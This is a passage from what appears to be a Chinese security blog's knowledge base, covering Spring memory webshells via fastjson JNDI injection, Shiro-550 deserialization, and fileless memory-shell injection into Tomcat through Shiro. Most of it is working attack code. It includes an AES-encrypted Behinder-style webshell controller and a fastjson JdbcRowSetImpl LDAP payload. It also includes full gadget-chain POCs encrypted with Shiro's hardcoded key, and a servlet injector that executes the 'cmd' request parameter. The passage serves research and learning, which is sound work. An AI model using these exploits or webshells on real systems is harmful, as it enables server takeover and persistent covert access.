(RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); HttpSession session = request.getSession(); if (request.getMethod().equals(\"POST\")) { session.setAttribute(\"u\", this.k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(this.k.getBytes(), \"AES\")); HelloWorldController helloWorldController = new HelloWorldController(ClassLoader.getSystemClassLoader()); String base64String = request.getReader().readLine(); byte[] bytesEncrypted = new sun.misc.BASE64Decoder().decodeBuffer(base64String); byte[] bytesDecrypted = c.doFinal(bytesEncrypted); Class newClass = helloWorldController.g(bytesDecrypted); Map pageContext = new HashMap(); pageContext.put(\"session\", session); pageContext.put(\"request\", request); pageContext.put(\"response\", response); newClass.newInstance().equals(pageContext); } return response; } } 无文件落地注入 这里我使用maven添加fastjson 1.2.24,使用jndi注入，当newInsatnce之后注册路由，并在此路由上绑定对应Controller 0x1 jndi 测试 Spring 要解析客户端发送的json数据，大部分是使用Jackson,fastjson也可以 首先引入依赖 com.alibaba fastjson 1.2.24 然后在Controller里写入由fastjson解析json对象的方法 @RequestMapping(value = \"/testjson\", consumes = {\"application/json\"}, produces = {\"application/json\"}) @ResponseBody public String showUserListInJson(HttpServletRequest request,HttpServletResponse response) throws IOException { BufferedReader bufferedReader = request.getReader(); String bodyStr,body = \"\"; while((bodyStr = bufferedReader.readLine()) != null){ body += bodyStr; } System.out.println(body); System.out.println(JSON.parse(body)); return body; } package com.spring.Controller; public class User { private Integer userId = 0; private String userName = \"\"; public User(){} public Integer getUserId() { return this.userId; } public void setUserId(Integer userId) { System.out.println(\"set running\"); this.userId = userId; } public String getUserName() { return this.userName; } public void setUserName(String userName) { System.out.println(\"set running\"); this.userName = userName; } @Override public String toString(){ return \"User{\" + \"name='\" + userName + '\\'' + ',' + \"id='\" + userId + '\\'' + '}'; } } public class Exec { public Exec() { System.out.println(\"hello world\"); } } 启动web，启动marshalsec，发送如下payload POST /testjson HTTP/1.1 Host: 127.0.0.1:8081 Cache-Control: max-age=0 sec-ch-ua: \"Chromium\";v=\"91\", \" Not;A Brand\";v=\"99\" sec-ch-ua-mobile: ?0 Upgrade-Insecure-Requests: 1 User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.114 Safari/537.36 Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9 Sec-Fetch-Site: none Sec-Fetch-Mode: navigate Sec-Fetch-User: ?1 Sec-Fetch-Dest: document Accept-Encoding: gzip, deflate Accept-Language: zh-CN,zh;q=0.9 Connection: close Content-Type: application/json Content-Length: 112 { \"@type\":\"com.sun.rowset.JdbcRowSetImpl\", \"dataSourceName\":\"ldap://127.0.0.1:1389/abc\", \"autoCommit\":true } 0x2 jndi 注入冰蝎马 如果执行的字节码文件需要不用引入其他包，那么直接执行Runtime.getRuntime.exec即可执行命令，反弹shell等操作，但是如果需要在spring 应用中注入，那么需要使用spring相关的包，才能获取到对应的context，在这里需要使用maven项目，添加对应的spring 包，或者有jar包也可以直接添加到lib文件里，然后用idea编译成class文件，对应在target目录下 import org.springframework.web.context.WebApplicationContext; import org.springframework.web.context.request.RequestContextHolder; import org.springframework.web.context.request.ServletRequestAttributes; import org.springframework.web.servlet.handler.AbstractHandlerMethodMapping; import org.springframework.web.servlet.mvc.condition.PatternsRequestCondition; import org.springframework.web.servlet.mvc.condition.RequestMethodsRequestCondition; import org.springframework.web.servlet.mvc.method.RequestMappingInfo; import org.springframework.web.servlet.mvc.method.annotation.RequestMappingHandlerMapping; import javax.crypto.BadPaddingException; import javax.crypto.Cipher; import javax.crypto.IllegalBlockSizeException; import javax.crypto.NoSuchPaddingException; import javax.crypto.spec.SecretKeySpec; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import javax.servlet.http.HttpSession; import java.io.IOException; import java.lang.reflect.Field; import java.lang.reflect.InvocationTargetException; import java.lang.reflect.Method; import java.security.InvalidKeyException; import java.security.NoSuchAlgorithmException; import java.util.*; public class Exec extends ClassLoader{ private final String k = \"e45e329feb5d925b\"; public Exec(ClassLoader c) { super(c); } public Class g(byte[] b) { return super.defineClass(b, 0, b.length); // 调用父类的defineClass函数 } public Exec(String aaa){} public Exec() throws ClassNotFoundException, IllegalAccessException, NoSuchMethodException, NoSuchFieldException, InvocationTargetException { WebApplicationContext context = (WebApplicationContext) RequestContextHolder.currentRequestAttributes().getAttribute(\"org.springframework.web.servlet.DispatcherServlet.CONTEXT\", 0); // 1. 从当前上下文环境中获得 RequestMappingHandlerMapping 的实例 bean RequestMappingHandlerMapping mappingHandlerMapping = context.getBean(RequestMappingHandlerMapping.class); // 可选步骤，判断url是否存在 AbstractHandlerMethodMapping abstractHandlerMethodMapping = context.getBean(AbstractHandlerMethodMapping.class); Method method = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping\").getDeclaredMethod(\"getMappingRegistry\"); method.setAccessible(true); Object mappingRegistry = (Object) method.invoke(abstractHandlerMethodMapping); Field field = Class.forName(\"org.springframework.web.servlet.handler.AbstractHandlerMethodMapping$MappingRegistry\").getDeclaredField(\"urlLookup\"); field.setAccessible(true); Map urlLookup = (Map) field.get(mappingRegistry); Iterator urlIterator = urlLookup.keySet().iterator(); List urls = new ArrayList(); while (urlIterator.hasNext()){ String urlPath = (String) urlIterator.next(); if (\"/jnditest\".equals(urlPath)){ System.out.println(\"url已存在\"); return; } } // 可选步骤，判断url是否存在 // 2. 通过反射获得自定义 controller 中test的 Method 对象 Method method2 = Exec.class.getMethod(\"test\"); // 3. 定义访问 controller 的 URL 地址 PatternsRequestCondition url = new PatternsRequestCondition(\"/jnditest\"); // 4. 定义允许访问 controller 的 HTTP 方法（GET/POST） RequestMethodsRequestCondition ms = new RequestMethodsRequestCondition(); // 5. 在内存中动态注册 controller RequestMappingInfo info = new RequestMappingInfo(url, ms, null, null, null, null, null); // 创建用于处理请求的对象，加入“aaa”参数是为了触发第二个构造函数避免无限循环 Exec injectToController = new Exec(\"aaa\"); mappingHandlerMapping.registerMapping(info, injectToController, method2); System.out.println(\"hello world\"); } // controller指定的处理方法 public HttpServletResponse test() throws NoSuchPaddingException, NoSuchAlgorithmException, InvalidKeyException, IOException, BadPaddingException, IllegalBlockSizeException, IllegalAccessException, InstantiationException { HttpServletRequest request = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getRequest(); HttpServletResponse response = ((ServletRequestAttributes) (RequestContextHolder.currentRequestAttributes())).getResponse(); HttpSession session = request.getSession(); if (request.getMethod().equals(\"POST\")) { session.setAttribute(\"u\", this.k); Cipher c = Cipher.getInstance(\"AES\"); c.init(2, new SecretKeySpec(this.k.getBytes(), \"AES\")); Exec helloWorldController = new Exec(ClassLoader.getSystemClassLoader()); String base64String = request.getReader().readLine(); byte[] bytesEncrypted = new sun.misc.BASE64Decoder().decodeBuffer(base64String); byte[] bytesDecrypted = c.doFinal(bytesEncrypted); Class newClass = helloWorldController.g(bytesDecrypted); Map pageContext = new HashMap(); pageContext.put(\"session\", session); pageContext.put(\"request\", request); pageContext.put(\"response\", response); newClass.newInstance().equals(pageContext); } return response; } } 生成的Exec.class 问题总结 编译的时候，jdk最好选择服务器对应的jdk版本，jdk11 和 jdk8 跨大版本，在编译成功之后使用jndi注入会报错，而且是十分致命的错误 maven项目，尽量也要选择与目标主机spring相差不大的版本，保证能获取到Context参考链接 https://landgrey.me/blog/19/ https://landgrey.me/blog/12/ https://www.anquanke.com/post/id/198886#h2-0 https://www.cnblogs.com/bitterz/p/14820898.html https://www.cnblogs.com/wudb/archive/2017/08/31/7458856.html https://www.cnblogs.com/DDgougou/p/9621675.html https://blog.csdn.net/xcxy2015/article/details/80746614 https://stackoverflow.com/questions/34414906/classloading-using-different-versions-of-the-same-class-java-lang-linkageerror https://blog.csdn.net/weixin_44411569/article/details/91379483 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:25:06 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/11.Spring框架内存马入门.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/12.Shiro550分析.html":{"url":"知识库/02.JAVA安全/12.Shiro550分析.html","title":"12.Shiro550分析","keywords":"","body":" 简介 环境搭建 攻击流程 问题说明 0X1 org.apache.shiro.io.DefaultSerializer.deserialize:40 0x2 org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass:20 0x3 org.apache.shiro.util.ClassUtils.forName:59 POC1 POC2 参考链接 简介 Apache Shiro是一个强大且易用的Java安全框架，执行身份验证、授权、密码和会话管理。使用Shiro易于理解的API，开发者可以快速、轻松地获得任何应用程序，从最小的移动应用程序到最大的网络和企业应用程序。 在Shiro 环境搭建 在这里选择下载源码来搭建，下载好之后使用最简单的servlet来搭建靶场，倒入shiro-shiro-root-1.2.4 -> samples -> web -> pom.xml 在配置完成之后，打开打开会报如下错 解决办法 下载JSTL标签库，并将其导入IDEA中，如下所示 然后再导入到对应war包里 启动项目如下所示 此时可以看见项目自带了Commons Collections 3.2.1 ，但是在war 包的依赖里没有，这里再将Commons Collections 3.2.1 添加到war包里 自此环境搭建成功 攻击流程 漏洞触发主要有4步 传入Cookie rememberMe BASE64解码 AES解码 反序列化 第1步可以看到shiro的主要特征，就是在Response 的Set-Cookie: rememberMe=deleteMe;一般在登录处就可以看到，由于改项目是一个很简单的servlet，没有很复杂的Controller设计，都是通过Cookie来控制的身份认证 第2步是在Request中的Cookie: rememberMe:xxx进行base64解码 第3步则是将第2步解码的数据进行AES解码，AES是对称加密算法，如果能得知密钥那么加解密就完全受控制了 第4步则是将AES解密算法解密后的数据，进行反序列化，也就是readObject() 那么我们在生成payload的时候，要完成对应AES加密，在AES加密的过程中就需要得知对应的密钥，在此可以知道，shiro // AbstractRememberMeManager.java // 硬编码的密钥 private static final byte[] DEFAULT_CIPHER_KEY_BYTES = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); // 加密算法 public ByteSource encrypt(byte[] plaintext, byte[] key) { byte[] ivBytes = null; boolean generate = this.isGenerateInitializationVectors(false); if (generate) { ivBytes = this.generateInitializationVector(false); if (ivBytes == null || ivBytes.length == 0) { throw new IllegalStateException(\"Initialization vector generation is enabled - generated vectorcannot be null or empty.\"); } } return this.encrypt(plaintext, key, ivBytes, generate); } private ByteSource encrypt(byte[] plaintext, byte[] key, byte[] iv, boolean prependIv) throws CryptoException { int MODE = true; byte[] output; if (prependIv && iv != null && iv.length > 0) { byte[] encrypted = this.crypt(plaintext, key, iv, 1); output = new byte[iv.length + encrypted.length]; System.arraycopy(iv, 0, output, 0, iv.length); System.arraycopy(encrypted, 0, output, iv.length, encrypted.length); } else { output = this.crypt(plaintext, key, iv, 1); } if (log.isTraceEnabled()) { log.trace(\"Incoming plaintext of size \" + (plaintext != null ? plaintext.length : 0) + \". Ciphertext \" + \"byte array is size \" + (output != null ? output.length : 0)); } return Util.bytes(output); } 所以客户端生成对应的加密代码就可以这样写 byte[] payloads = byte[] seariaz_data AesCipherService aes = new AesCipherService(); byte[] key = new BASE64Decoder().decodeBuffer(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); 问题说明 在复现过程中，由于shiro默认使用的commons collections 版本号是3.2.1 但是在复现的过程中，在tomcat下无法直接利用 commons-collections:3.2.1 的问题 0X1 org.apache.shiro.io.DefaultSerializer.deserialize:40 这里我们直接看反序列化发生的点，第49行使用了 ClassResolvingObjectInputStream 类而非传统的 ObjectInputStream .这里可能是开发人员做的一种防护措施？ 跟进readObject方法，他重写了 ObjectInputStream 类的 resolveClass 函数， ObjectInputStream 的 resolveClass 函数用的是 Class.forName 类获取当前描述器所指代的类的Class对象 0x2 org.apache.shiro.io.ClassResolvingObjectInputStream.resolveClass:20 然而重写后的 resolveClass 函数，采用的是 ClassUtils.forName ，我们继续看这个forName的实现。 0x3 org.apache.shiro.util.ClassUtils.forName:59 在这里可以看到与父类的forName方法不一样，再来看看这个 ExceptionIgnoringAccessor 是怎么实现的 这里实际上调用了 ParallelWebAppClassLoader 父类 WebappClassLoaderBase 的 loadClass 函数 该loadClass载入按照上述的顺序（这里不贴代码了，找到 org.apache.catalina.loader.WebappClassLoaderBase.loadClass 即可），先从cache中找已载入的类，如果前3点都没找到，再通过父类 URLClassLoader 的 loadClass 函数载入。但是实际上此时loadClass的参数name值带上了数组的标志，即 /Lorg/apache/commons/collections/Transformer;.class 那么找到原因之后，简单来说，只要使用Transformer链式调用transform()函数，都无法利用成功，那么在commons collections 3.2.1中就不使用Transformer类，那么POC如下 POC1 这里改改CC6(ysoserial) package com.test; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import sun.misc.BASE64Decoder; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class TestLazyMap { public static void main(String[] args) throws Exception { InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cls = pool.makeClass(\"Cat\"); String cmdlist = \"open /System/Applications/Calculator.app\"; String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\"+cmdlist+\"\\\");\"; cls.makeClassInitializer().insertBefore(cmd); String randomName = \"EvilCat\" + System.nanoTime(); cls.setName(randomName); cls.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cls.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field f = templates.getClass().getDeclaredField(\"_name\"); f.setAccessible(true); f.set(templates,\"123\"); Field f1 = templates.getClass().getDeclaredField(\"_bytecodes\"); f1.setAccessible(true); f1.set(templates,targetByteCodes); Field f2 = templates.getClass().getDeclaredField(\"_class\"); f2.setAccessible(true); f2.set(templates,null); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap,transformer); TiedMapEntry entry = new TiedMapEntry(lazyMap, templates); HashSet map = new HashSet(1); map.add(\"foo\"); Field f3 = null; try { f3 = HashSet.class.getDeclaredField(\"map\"); } catch (NoSuchFieldException e) { f3 = HashSet.class.getDeclaredField(\"backingMap\"); } f3.setAccessible(true); HashMap innimpl = null; innimpl = (HashMap) f3.get(map); Field f4 = null; try { f4 = HashMap.class.getDeclaredField(\"table\"); } catch (NoSuchFieldException e) { f4 = HashMap.class.getDeclaredField(\"elementData\"); } f4.setAccessible(true); Object[] array = new Object[0]; array = (Object[]) f4.get(innimpl); Object node = array[0]; if(node == null){ node = array[1]; } Field keyField = null; try{ keyField = node.getClass().getDeclaredField(\"key\"); }catch(Exception e){ keyField = Class.forName(\"java.util.MapEntry\").getDeclaredField(\"key\"); } keyField.setAccessible(true); keyField.set(node, entry); Field f5 = transformer.getClass().getDeclaredField(\"iMethodName\"); f5.setAccessible(true); f5.set(transformer,\"newTransformer\"); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(map); byte[] payloads = byteArrayOutputStream.toByteArray(); AesCipherService aes = new AesCipherService(); byte[] key = new BASE64Decoder().decodeBuffer(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); } } POC2 package com.test; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import javassist.ClassClassPath; import javassist.ClassPool; import javassist.CtClass; import org.apache.commons.collections.functors.InvokerTransformer; import org.apache.commons.collections.keyvalue.TiedMapEntry; import org.apache.commons.collections.map.LazyMap; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import sun.misc.BASE64Decoder; import java.io.ByteArrayOutputStream; import java.io.ObjectOutputStream; import java.lang.reflect.Field; import java.util.HashMap; import java.util.HashSet; import java.util.Map; public class TestLazyMap { public static void main(String[] args) throws Exception { InvokerTransformer transformer = new InvokerTransformer(\"toString\", new Class[0], new Object[0]); ClassPool pool = ClassPool.getDefault(); pool.insertClassPath(new ClassClassPath(AbstractTranslet.class)); CtClass cls = pool.makeClass(\"Cat\"); String cmdlist = \"open /System/Applications/Calculator.app\"; String cmd = \"java.lang.Runtime.getRuntime().exec(\\\"\"+cmdlist+\"\\\");\"; cls.makeClassInitializer().insertBefore(cmd); String randomName = \"EvilCat\" + System.nanoTime(); cls.setName(randomName); cls.setSuperclass(pool.get(AbstractTranslet.class.getName())); byte[] classBytes = cls.toBytecode(); byte[][] targetByteCodes = new byte[][]{classBytes}; TemplatesImpl templates = TemplatesImpl.class.newInstance(); Field f = templates.getClass().getDeclaredField(\"_name\"); f.setAccessible(true); f.set(templates,\"123\"); Field f1 = templates.getClass().getDeclaredField(\"_bytecodes\"); f1.setAccessible(true); f1.set(templates,targetByteCodes); Field f2 = templates.getClass().getDeclaredField(\"_class\"); f2.setAccessible(true); f2.set(templates,null); Map innerMap = new HashMap(); Map lazyMap = LazyMap.decorate(innerMap,transformer); TiedMapEntry entry = new TiedMapEntry(lazyMap, \"foo\"); HashSet map = new HashSet(1); map.add(entry); lazyMap.remove(\"foo\"); Field f3 = transformer.getClass().getDeclaredField(\"iMethodName\"); f3.setAccessible(true); f3.set(transformer,\"newTransformer\"); Field f4 = entry.getClass().getDeclaredField(\"key\"); f4.setAccessible(true); f4.set(entry,templates); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); ObjectOutputStream objectOutputStream = new ObjectOutputStream(byteArrayOutputStream); objectOutputStream.writeObject(map); byte[] payloads = byteArrayOutputStream.toByteArray(); AesCipherService aes = new AesCipherService(); byte[] key = new BASE64Decoder().decodeBuffer(\"kPH+bIxk5D2deZiIxcaaaA==\"); ByteSource ciphertext = aes.encrypt(payloads, key); System.out.printf(ciphertext.toString()); } } 参考链接 https://blog.csdn.net/m0_67392409/article/details/124100291 https://blog.csdn.net/HongYu012/article/details/123112913 https://xz.aliyun.com/t/7950?page=5 Copyright © aaron 2023 all right reserved，powered by Gitbook该文章修订时间： 2023-05-19 16:23:53 Author: aaron Url: https://byaaronluo.github.io/知识库/02.JAVA安全/12.Shiro550分析.html Source: aaron 知识库 This article was originally published in「aaron 知识库」,Reproduced please indicate the source, thank you for cooperation! "},"知识库/02.JAVA安全/13.Shiro550无文件内存马.html":{"url":"知识库/02.JAVA安全/13.Shiro550无文件内存马.html","title":"13.Shiro550无文件内存马","keywords":"","body":" 简介 环境 攻击流程 注意事项 0x1 注入Servlet普通内存马 步骤 0x2 注入Servlet 冰歇马 0x3 注入Listener冰歇内存马 提出问题 参考链接 简介 在Tomcat内存马无文件攻击中，介绍了存在反序列化点的时候，发送base64 编码之后的序列化数据，通过反序列化执行代码，注入Tomcat Fiilter，Tomcat Servlet，Tomcat Listener进行无文件生成内存马达到权限维持的目的，本章主要内容是利用shiro的反序列化点进行无文件注入内存马的一些注意事项 shiro550 反序列化由于是存在于Cookie的rememberMe字段中，当将序列化的文件通过base64编码之后，再AES加密生成的AES加密的字符发送到服务端执行反序列化，在shiro550 反序列化分析一文中虽然存在Commons-Collections3.2.1 但是在此过程中存在防护，不能使用Transformer类，就只能使用TemplatesImpl实例化_bytecodes来进行代码执行，以下使用CB1来进行注入 环境 环境搭建参考shiro550 反序列化分析一文中的环境搭建，下面为本次使用的版本信息 jdk jdk8u181 tomcat tomcat8.5.79 攻击流程 和Tomcat内存马无文件攻击一样，首先需要获取获取request，然后通过request获取对应的获取ServletContext，进而获取到StandardContext，进行注入Servlet和Listener，注意这里没有Filter（由于Shiro本身就是一个Filter，我在这里测试发现并不能注入，在将我们的filter放置到最前的时候，会报错，直接进入catch语句里，但是注入Filter类型内存马是可行的，但是暂未复现成功） 注意事项 由于shiro反序列化的时候payload是存放在HTTP Header中，在HTTP 传输协议当中，HTTP头部不能携带超大数据进行传输，当超过最大的限制则会直接报400客户端错误，这一步是最为关键的，在合适的HTTP Header Size才是最优解，看了很多博客尝试通过反射修改Tomcat HTTPHeaderSize尝试之后发现并不可行，在执行过程中报错sun.misc.launcher$appclassloader cannot be cast to org.apache.catalina.loader.webappclassloaderbase大概意思就是未能转化webappclassloaderbase，最终选择使用通用版shiro回显的payload 0x1 注入Servlet普通内存马 这里使用fnmsd大佬提供的payload 获取request，通过编译之后只有3.8K的大小，这里需要继承AbstractTranslet类，因为要通过TemplatesImpl的实例化 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.lang.reflect.Field; import java.util.HashSet; import java.util.Scanner; public class Main extends AbstractTranslet { static HashSet h; static HttpServletRequest r; static HttpServletResponse p; public Main() { r = null; p = null; h = new HashSet(); F(Thread.currentThread(), 0); } private static boolean i(Object obj) { if (obj == null || h.contains(obj)) { return true; } h.add(obj); return false; } private static void p(Object o, int depth) { if (depth > 52 || (r != null && p != null)) { return; } if (!i(o)) { if (r == null && HttpServletRequest.class.isAssignableFrom(o.getClass())) { r = (HttpServletRequest) o; if (r.getParameter(\"cmd\") == null) { r = null; } else { try { p = (HttpServletResponse) r.getClass().getMethod(\"getResponse\").invoke(r); } catch (Exception e) { r = null; } } } if (r != null && p != null) { try { p.getWriter().println(new Scanner(Runtime.getRuntime().exec(r.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next()); p.getWriter().flush(); } catch (Exception e) { } return; } F(o, depth + 1); } } private static void F(Object start, int depth) { Class n = start.getClass(); do { for (Field declaredField : n.getDeclaredFields()) { declaredField.setAccessible(true); Object o = null; try { o = declaredField.get(start); if (!o.getClass().isArray()) { p(o, depth); } else { for (Object q : (Object[]) o) { p(q, depth); } } } catch (Exception e) { } } } while ( (n = n.getSuperclass()) != null ); } @Override public void transform(DOM d, SerializationHandler[] h) { } @Override public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) { } } 再编写CB1链的代码，通过读取Main.class再将其放置在TemplatesImpl的_bytecodes中，最后再反序列化生成cb1.ser package com.test; import com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl; import com.sun.org.apache.xalan.internal.xsltc.trax.TransformerFactoryImpl; import org.apache.commons.beanutils.BeanComparator; import java.io.*; import java.lang.reflect.Field; import java.util.PriorityQueue; public class CB1Test { public static void main(String[] args) throws Exception { byte[] clazzBytes = getBytes(); TemplatesImpl templates = TemplatesImpl.class.newInstance(); setFieldValue(templates, \"_bytecodes\", new byte[][]{clazzBytes}); setFieldValue(templates, \"_name\", \"HelloTemplatesImpl\"); setFieldValue(templates, \"_tfactory\", new TransformerFactoryImpl()); BeanComparator comparator = new BeanComparator(null, String.CASE_INSENSITIVE_ORDER); PriorityQueue queue = new PriorityQueue(2, comparator); queue.add(\"1\"); queue.add(\"1\"); setFieldValue(comparator, \"property\", \"outputProperties\"); setFieldValue(queue, \"queue\", new Object[]{templates, templates}); try{ FileOutputStream fileOutputStream = new FileOutputStream(\"cb1.ser\"); ObjectOutputStream objectOutputStream = new ObjectOutputStream(fileOutputStream); objectOutputStream.writeObject(queue); }catch (Exception e){ e.printStackTrace(); } } public static void setFieldValue(Object object, String field, Object args) throws Exception { Field f0 = object.getClass().getDeclaredField(field); f0.setAccessible(true); f0.set(object,args); } public static byte[] getBytes() throws Exception { String tomcatEcho = \"\"; InputStream inputStream = new FileInputStream(tomcatEcho); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); int n = 0; while ((n=inputStream.read())!=-1){ byteArrayOutputStream.write(n); } byte[] bytes = byteArrayOutputStream.toByteArray(); return bytes; } } 然后在shiro中对上一步生成的cb1进行base64编码+AES加密 package com.test; import org.apache.shiro.codec.Base64; import org.apache.shiro.crypto.AesCipherService; import org.apache.shiro.util.ByteSource; import java.io.ByteArrayOutputStream; import java.io.FileInputStream; import java.io.InputStream; public class AESEncode { public static void main(String[] args)throws Exception { String tomcatEcho = \"\"; byte[] key = Base64.decode(\"kPH+bIxk5D2deZiIxcaaaA==\"); AesCipherService aes = new AesCipherService(); ByteSource ciphertext = aes.encrypt(getBytes(tomcatEcho), key); System.out.printf(ciphertext.toString()); } public static byte[] getBytes(String path) throws Exception{ InputStream inputStream = new FileInputStream(path); ByteArrayOutputStream byteArrayOutputStream = new ByteArrayOutputStream(); int n = 0; while ((n=inputStream.read())!=-1){ byteArrayOutputStream.write(n); } byte[] bytes = byteArrayOutputStream.toByteArray(); return bytes; } } 第一步首先编译Main.java 第二步，将编译生成的Main.class写入到TemplatesImpl._bytecodes中 第三步，将序列化得到的CB1.ser通过AES加密，放置到Cookie的rememberMe字段中 最后携带参数即可执行命令 在此过程中我们可以发现，要执行命令就必须得带上这一串臃肿的Cookie，这显然与我们的注入内存马还是有点偏差，那么需要如何改造呢？当然还是得注入Servlet或者Listener 如果在fnmsd大佬提供的payload，那么还是会超过MaxHTTPHeaderSize，那么我们知道HTTP协议中POST请求的参数可以携带大体积的参数，那么就只需要在该payload中再添加一个反序列化点，在POST请求体中获取反序列化的地方，进行反序列化完成二次注入，这样来执行命令 首先完善payload，加上获取data参数的逻辑，再进行反序列化 import com.sun.org.apache.xalan.internal.xsltc.DOM; import com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet; import com.sun.org.apache.xml.internal.dtm.DTMAxisIterator; import com.sun.org.apache.xml.internal.serializer.SerializationHandler; import sun.misc.BASE64Decoder; import javax.servlet.http.HttpServletRequest; import javax.servlet.http.HttpServletResponse; import java.io.ByteArrayInputStream; import java.io.ObjectInputStream; import java.lang.reflect.Field; import java.util.HashSet; import java.util.Scanner; public class Main extends AbstractTranslet { static HashSet h; static HttpServletRequest r; static HttpServletResponse p; public Main() { r = null; p = null; h = new HashSet(); F(Thread.currentThread(), 0); } private static boolean i(Object obj) { if (obj == null || h.contains(obj)) { return true; } h.add(obj); return false; } private static void p(Object o, int depth) { if (depth > 52 || (r != null && p != null)) { return; } if (!i(o)) { if (r == null && HttpServletRequest.class.isAssignableFrom(o.getClass())) { r = (HttpServletRequest) o; if (r.getParameter(\"cmd\") == null) { r = null; } else { try { p = (HttpServletResponse) r.getClass().getMethod(\"getResponse\").invoke(r); } catch (Exception e) { r = null; } } } if (r != null && p != null) { try { if(r.getParameter(\"data\")!=null){ byte[] buff = new BASE64Decoder().decodeBuffer(r.getParameter(\"data\")); ByteArrayInputStream bai = new ByteArrayInputStream(buff); ObjectInputStream ois = new ObjectInputStream(bai); ois.readObject(); }else{ p.getWriter().println(new Scanner(Runtime.getRuntime().exec(r.getParameter(\"cmd\")).getInputStream()).useDelimiter(\"\\\\A\").next()); p.getWriter().flush(); } } catch (Exception e) { } return; } F(o, depth + 1); } } private static void F(Object start, int depth) { Class n = start.getClass(); do { for (Field declaredField : n.getDeclaredFields()) { declaredField.setAccessible(true); Object o = null; try { o = declaredField.get(start); if (!o.getClass().isArray()) { p(o, depth); } else { for (Object q : (Object[]) o) { p(q, depth); } } } catch (Exception e) { } } } while ( (n = n.getSuperclass()) != null ); } @Override public void transform(DOM d, SerializationHandler[] h) { } @Override public void transform(DOM d, DTMAxisIterator i, SerializationHandler h) { } } 然后这里使用天下大木头的TomcatEcho.java的代码，修改修改，使用遍历Thread获取request public static HttpServletRequest getRequest() { try { boolean flag = false; Thread[] threads = (Thread[]) getField(Thread.currentThread().getThreadGroup(), \"threads\"); for (int i = 0; i 当获取到request之后，完成注入servlet的代码 static { HttpServletRequest request = getRequest(); ServletContext servletContext = request.getSession().getServletContext(); if (servletContext == null) { System.out.println(\"未获取到servletContext\"); } else { try { Field appctx = servletContext.getClass().getDeclaredField(\"context\"); appctx.setAccessible(true); ApplicationContext applicationContext = (ApplicationContext) appctx.get(servletContext); Field stdctx = applicationContext.getClass().getDeclaredField(\"context\"); stdctx.setAccessible(true); StandardContext standardContext = (StandardContext) stdctx.get(applicationContext); Servlet demo = new Behinder(); org.apache.catalina.Wrapper demoWrapper = standardContext.createWrapper(); //设置Servlet名等 demoWrapper.setName(servletName); demoWrapper.setLoadOnStartup(1); demoWrapper.setServlet(demo); demoWrapper.setServletClass(demo.getClass().getName()); standardContext.addChild(demoWrapper); //设置ServletMap standardContext.addServletMapping(servletUrlPattern, servletName); System.out.println(\"success\"); } catch (Exception e) { try { java.lang.Runtime.getRuntime().exec(\"open /System/Applications/Calculator.app\"); } catch (Exception a) { a.printStackTrace(); } System.out.println(\"失败了！草\"); e.printStackTrace(); } } } 最后再在servlet的service中添加恶意代码 @Override public void service(ServletRequest servletRequest, ServletResponse servletResponse) throws ServletException, IOException { try { System.out.println(\"do service\"); HttpServletRequest request = (HttpServletRequest) servletRequest; HttpServletResponse response = (HttpServletResponse) servletResponse; response.getWriter().println(new 